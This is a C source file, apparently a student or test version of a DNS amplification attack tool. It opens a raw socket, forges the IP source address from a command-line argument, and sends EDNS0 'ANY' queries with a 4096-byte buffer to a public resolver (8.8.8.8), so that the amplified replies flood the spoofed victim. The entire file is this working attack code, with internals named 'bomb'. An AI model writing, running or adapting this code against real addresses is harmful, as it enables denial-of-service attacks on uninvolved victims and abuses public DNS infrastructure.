#pragma pack(1) /*packet in line*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <getopt.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>


/* Define settings */
#define DEFAULT_SPOOF_ADDR  "127.0.0.1"
#define DEFAULT_DOMAIN      "www.nctu.edu.tw"
#define DEFAULT_DNS_PORT    53
#define DEFAULT_LOOPS       10000


/* Initialize global varible */
char *spoof_address;


/* All the structure */
typedef struct {
    unsigned short id;
    unsigned char rd :1;
    unsigned char tc :1;
    unsigned char aa :1;
    unsigned char opcode :4;
    unsigned char qr :1;
    unsigned char rcode :4;
    unsigned char cd :1;
    unsigned char ad :1;
    unsigned char z :1;
    unsigned char ra :1;
    unsigned short q_count;
    unsigned short ans_count;
    unsigned short auth_count;
    unsigned short add_count;
} DNS_header;


typedef struct {
    unsigned short qtype;
    unsigned short qclass;
} DNS_query;

typedef struct{
    unsigned char name;
    unsigned short type;
    unsigned short udplength;
    unsigned char rcode;
    unsigned char ednsversion;
    unsigned short Z;
    unsigned short datalength;
} DNS_opt;

/* our bomb */
typedef struct {
    int one;
    int sock;
    char *packet;
    struct sockaddr_in target;
    struct iphdr *ip;
    struct udphdr *udp;
    DNS_header *dns;
    DNS_query *query;
    DNS_opt *opt;
} bomb_t;


void check_uid();

/* net stuff */
bomb_t *create_rawsock(bomb_t *);
bomb_t *stfu_kernel(bomb_t *);
unsigned short checksum(unsigned short *, int);
bomb_t *build_ip_header(bomb_t *);
bomb_t *build_udp_header(bomb_t *);
bomb_t *build_dns_request(bomb_t *);
void dns_name_format(char *, char *);
bomb_t *build_packet(bomb_t *,  int);
bomb_t *fill_sockaddr(bomb_t *);
void Implement(int);


/* create raw socket */
bomb_t *create_rawsock(bomb_t *bomb)
{
    bomb->sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    return bomb;
}


/* say STFU to kernel - we set our own headers */
bomb_t *stfu_kernel(bomb_t *bomb)
{
    bomb->one = 1;

    setsockopt(bomb->sock, IPPROTO_IP, IP_HDRINCL, &bomb->one, 
                sizeof(bomb->one));

    return bomb;
}


/* checksum for IP and UDP header */
unsigned short checksum(unsigned short *addr, int len)
{
    u_int32_t cksum  = 0;
    
    
    while(len > 0) {
        cksum += *addr++;
        len -= 2;
    }

    if(len == 0) {
        cksum += *(unsigned char *) addr;
    }
    
    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum = cksum + (cksum >> 16);

    return (~cksum);
}


/* build and fill in ip header */
bomb_t *build_ip_header(bomb_t *bomb)
{
    bomb->ip = (struct iphdr *) bomb->packet;

    bomb->ip->version = 4;
    bomb->ip->ihl = 5;
    bomb->ip->id = htonl(rand());
    bomb->ip->saddr = inet_addr(spoof_address);
    bomb->ip->daddr = inet_addr("8.8.8.8");
    bomb->ip->ttl = 64;
    bomb->ip->tos = 0;
    bomb->ip->frag_off = 0;
    bomb->ip->protocol = IPPROTO_UDP;
    bomb->ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) +
                              sizeof(DNS_header) + sizeof(DNS_query) + sizeof(DNS_opt)
                             + strlen(DEFAULT_DOMAIN) + 1);
    bomb->ip->check = checksum((unsigned short *) bomb->ip,
                               sizeof(struct iphdr));

    return bomb;
}


/* build and fill in udp header */
bomb_t *build_udp_header(bomb_t *bomb)
{
    bomb->udp = (struct udphdr *) (bomb->packet + sizeof(struct iphdr));

    bomb->udp->source = htons(rand());
    bomb->udp->dest = htons(DEFAULT_DNS_PORT);
    bomb->udp->len = htons(sizeof(struct udphdr) + sizeof(DNS_header) + sizeof(DNS_opt) + sizeof(DNS_query) + strlen(DEFAULT_DOMAIN) + 1);
    bomb->udp->check = 0;

    return bomb;
}


/* convert to dns format */
void dns_name_format(char *qname, char *host)
{
    int i = 0;
    int j = 0;

    
    for (i = 0 ; i < (int) strlen(host) ; i++) {
        if (host[i] == '.') {
            *qname++ = i-j;
            for (; j < i; j++) {
                *qname++ = host[j];
            }
            j++;
        }
    }

    *qname++ = 0x00;
}


/* build and fill in dns request */
bomb_t *build_dns_request(bomb_t *bomb)
{
    char *qname = NULL;


    bomb->dns = (DNS_header *) (bomb->packet + sizeof(struct iphdr) + 
                           sizeof(struct udphdr));

    bomb->dns->id = (unsigned short) htons(getpid());
    bomb->dns->qr = 0;
    bomb->dns->opcode = 0;
    bomb->dns->aa = 0;
    bomb->dns->tc = 0;
    bomb->dns->rd = 1;
    bomb->dns->ra = 0;
    bomb->dns->z = 0;
    bomb->dns->ad = 0;
    bomb->dns->cd = 0;
    bomb->dns->rcode = 0;
    bomb->dns->q_count = htons(1);
    bomb->dns->ans_count = 0;
    bomb->dns->auth_count = 0;
    bomb->dns->add_count = htons(1);

    qname = &bomb->packet[sizeof(struct iphdr) + sizeof(struct udphdr) + 
        sizeof(DNS_header)];
    /*job->domain = "www.google.com.";*/
    dns_name_format(qname, DEFAULT_DOMAIN);

    bomb->query = (DNS_query *) &bomb->packet[sizeof(struct iphdr) + 
        sizeof(struct udphdr) + sizeof(DNS_header) + (strlen(qname) + 1)];

    bomb->query->qtype = htons(255);
    bomb->query->qclass = htons(1);
    bomb->opt = (DNS_opt*)(bomb->packet + sizeof(struct iphdr) + 
                           sizeof(struct udphdr) + sizeof(DNS_header) + (strlen(qname)) + sizeof(DNS_query) + 1);
    bomb->opt->name = 0;
    /*printf("%d\n",bomb->opt->type);*/
    bomb->opt->type  =htons(41) ;
    /*printf("%d\n",bomb->opt->type);*/
    bomb->opt->udplength =htons(4096);
    bomb->opt->rcode = 0;
    bomb->opt->ednsversion = 0;
    bomb->opt->Z = htons(0x8000);
    bomb->opt->datalength = 0;
    return bomb;
}


/* build packet */
bomb_t *build_packet(bomb_t *bomb, int c)
{   
    printf("check3\n");
    bomb->packet = (char *) malloc(4096);
    bomb->packet = memset(bomb->packet, 0x00, 4096);

    bomb = build_ip_header(bomb);
    bomb = build_udp_header(bomb);
    bomb = build_dns_request(bomb);

    return bomb;
}


/* fill in sockaddr_in {} */
bomb_t *fill_sockaddr(bomb_t *bomb)
{
    bomb->target.sin_family = AF_INET;
    bomb->target.sin_port = bomb->udp->dest;
    bomb->target.sin_addr.s_addr = bomb->ip->daddr;

    return bomb;
}


/* start action! */
void Implement(int c)
{
    bomb_t *bomb = NULL;

    
    bomb = (bomb_t *) malloc(sizeof(bomb_t));
    bomb = memset(bomb, 0x00, sizeof(bomb_t));

    bomb = create_rawsock(bomb);
    bomb = stfu_kernel(bomb);
    bomb = build_packet(bomb, c);
    bomb = fill_sockaddr(bomb);

    sendto(bomb->sock, bomb->packet, sizeof(struct iphdr) + 
            sizeof(struct udphdr) + sizeof(DNS_header) + sizeof(DNS_query) + sizeof(DNS_opt)+ strlen(DEFAULT_DOMAIN) + 1, 0, (struct sockaddr *) &bomb->target, 
            sizeof(bomb->target));

    close(bomb->sock);
    free(bomb->packet);
    free(bomb);

    return;
}


int main(int argc, char **argv)
{
    int a = 0;
    unsigned int i = 0;

    printf("%s\n", argv[1]);
    spoof_address = argv[1];
    printf("%s\n", spoof_address);

    for (i = 0; i < 10; i++) {
        Implement(a);
        printf("packet %d\n",i);
    }
    printf("\n");
    
    return 0;
}

